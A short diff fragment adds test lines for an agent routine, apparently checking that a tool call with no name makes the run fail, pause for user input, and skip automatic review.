+      const after = routine("ticket_get", { ticketBoard: true, autoReview: true });
+      after.setCalls([
+        { name: "web_search", args: { query: "news" }, executionId: "call-1" },
+        { args: { id: "T-1" }, executionId: "call-2" },
+      ]);
+      await after.run({ expectFailure: true });
+      expect(after.pauseRunForInput).toHaveBeenCalledOnce();
+      expect(reviewMock).not.toHaveBeenCalled();
     });
   });
 });
